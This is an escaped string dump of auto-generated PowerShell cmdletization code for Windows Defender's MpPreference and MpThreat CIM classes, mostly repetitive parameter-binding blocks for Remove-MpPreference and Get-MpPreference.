[object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableSshParsing')) {\r\n          [object]$__cmdletization_value = ${DisableSshParsing}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableSshParsing'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableSshParsing'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('PlatformUpdatesChannel')) {\r\n          [object]$__cmdletization_value = ${PlatformUpdatesChannel}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PlatformUpdatesChannel'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PlatformUpdatesChannel'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('EngineUpdatesChannel')) {\r\n          [object]$__cmdletization_value = ${EngineUpdatesChannel}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EngineUpdatesChannel'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EngineUpdatesChannel'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DefinitionUpdatesChannel')) {\r\n          [object]$__cmdletization_value = ${DefinitionUpdatesChannel}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DefinitionUpdatesChannel'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DefinitionUpdatesChannel'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableGradualRelease')) {\r\n          [object]$__cmdletization_value = ${DisableGradualRelease}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableGradualRelease'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableGradualRelease'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('AllowNetworkProtectionDownLevel')) {\r\n          [object]$__cmdletization_value = ${AllowNetworkProtectionDownLevel}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowNetworkProtectionDownLevel'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowNetworkProtectionDownLevel'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('AllowDatagramProcessingOnWinServer')) {\r\n          [object]$__cmdletization_value = ${AllowDatagramProcessingOnWinServer}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowDatagramProcessingOnWinServer'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowDatagramProcessingOnWinServer'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('EnableDnsSinkhole')) {\r\n          [object]$__cmdletization_value = ${EnableDnsSinkhole}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableDnsSinkhole'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableDnsSinkhole'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdleti"
"zation_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableInboundConnectionFiltering')) {\r\n          [object]$__cmdletization_value = ${DisableInboundConnectionFiltering}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableInboundConnectionFiltering'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableInboundConnectionFiltering'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableRdpParsing')) {\r\n          [object]$__cmdletization_value = ${DisableRdpParsing}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableRdpParsing'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableRdpParsing'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableNetworkProtectionPerfTelemetry')) {\r\n          [object]$__cmdletization_value = ${DisableNetworkProtectionPerfTelemetry}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableNetworkProtectionPerfTelemetry'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableNetworkProtectionPerfTelemetry'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('TrustLabelProtectionStatus')) {\r\n          [object]$__cmdletization_value = ${TrustLabelProtectionStatus}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TrustLabelProtectionStatus'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TrustLabelProtectionStatus'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('AllowSwitchToAsyncInspection')) {\r\n          [object]$__cmdletization_value = ${AllowSwitchToAsyncInspection}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowSwitchToAsyncInspection'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowSwitchToAsyncInspection'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ScanScheduleOffset')) {\r\n          [object]$__cmdletization_value = ${ScanScheduleOffset}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanScheduleOffset'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanScheduleOffset'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableTDTFeature')) {\r\n          [object]$__cmdletization_value = ${DisableTDTFeature}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableTDTFeature'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableTDTFeature'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableSmtpParsing')) {\r\n          [object]$__cmdletization_value = ${DisableSmtpParsing}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableSmtpParsing'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableSmtpParsing'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableQuicParsing')) {\r\n          [object]$__cmdletization_value = ${DisableQuicParsing}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableQuicParsing'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableQuicParsing'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('NetworkProtectionReputationMode')) {\r\n          [object]$__cmdletization_value = ${NetworkProtectionReputationMode}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NetworkProtectionReputationMode'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NetworkProtectionReputationMode'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('IntelTDTEnabled')) {\r\n          [object]$__cmdletization_value = ${IntelTDTEnabled}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IntelTDTEnabled'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IntelTDTEnabled'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('AttackSurfaceReductionRules_RuleSpecificExclusions_Id')) {\r\n          [object]$__cmdletization_value = ${AttackSurfaceReductionRules_RuleSpecificExclusions_Id}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_RuleSpecificExclusions_Id'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_RuleSpecificExc"
"lusions_Id'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('AttackSurfaceReductionRules_RuleSpecificExclusions')) {\r\n          [object]$__cmdletization_value = ${AttackSurfaceReductionRules_RuleSpecificExclusions}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_RuleSpecificExclusions'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_RuleSpecificExclusions'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('OobeEnableRtpAndSigUpdate')) {\r\n          [object]$__cmdletization_value = ${OobeEnableRtpAndSigUpdate}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'OobeEnableRtpAndSigUpdate'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'OobeEnableRtpAndSigUpdate'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('PerformanceModeStatus')) {\r\n          [object]$__cmdletization_value = ${PerformanceModeStatus}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PerformanceModeStatus'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PerformanceModeStatus'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('QuickScanIncludeExclusions')) {\r\n          [object]$__cmdletization_value = ${QuickScanIncludeExclusions}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'QuickScanIncludeExclusions'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'QuickScanIncludeExclusions'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableCacheMaintenance')) {\r\n          [object]$__cmdletization_value = ${DisableCacheMaintenance}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableCacheMaintenance'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableCacheMaintenance'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Force')) {\r\n          [object]$__cmdletization_value = ${Force}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:operationOption:Force'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:operationOption:Force'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('RemoveScanningThreadPoolCap')) {\r\n          [object]$__cmdletization_value = ${RemoveScanningThreadPoolCap}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemoveScanningThreadPoolCap'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemoveScanningThreadPoolCap'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Remove', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP MSFT_MpPreference.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Remove-MpPreference' -Alias '*'\r\n        \r\n\r\nfunction Get-MpPreference\r\n{\r\n    [CmdletBinding(DefaultParameterSetName='DefaultSet', PositionalBinding=$false)]\r\n    \r\n    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]\r\n[OutputType('Microsoft.Management.Infrastructure.CimInstance#root\\Microsoft\\Windows\\Defender\\MSFT_MpPreference')]\r\n\r\n    param(\r\n    \r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [switch]\r\n    ${AsJob})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()\r\n\r\n\r\n    $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder)\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP MSFT_MpPreference.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Get-MpPreference' -Alias '*'\r\n        \r\n"
"\r\n#requires -version 3.0\r\n\r\ntry { Microsoft.PowerShell.Core\\Set-StrictMode -Off } catch { }\r\n\r\n$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module\r\n\r\n$script:ClassName = 'ROOT\\Microsoft\\Windows\\Defender\\MSFT_MpThreat'\r\n$script:ClassVersion = '1.0'\r\n$script:ModuleVersion = '1.0'\r\n$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]\r\n\r\n$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()\r\n\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function @()\r\n        \r\n\r\nfunction __cmdletization_BindCommonParameters\r\n{\r\n    param(\r\n        $__cmdletization_objectModelWrapper,\r\n        $myPSBoundParameters\r\n    )       \r\n                \r\n\r\n        if ($myPSBoundParameters.ContainsKey('CimSession')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] \r\n        }\r\n                    \r\n\r\n        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] \r\n        }\r\n                    \r\n\r\n        if ($myPSBoundParameters.ContainsKey('AsJob')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] \r\n        }\r\n                    \r\n\r\n}\r\n                \r\n\r\nfunction Remove-MpThreat\r\n{\r\n    [CmdletBinding(PositionalBinding=$false)]\r\n    \r\n    \r\n    param(\r\n    \r\n    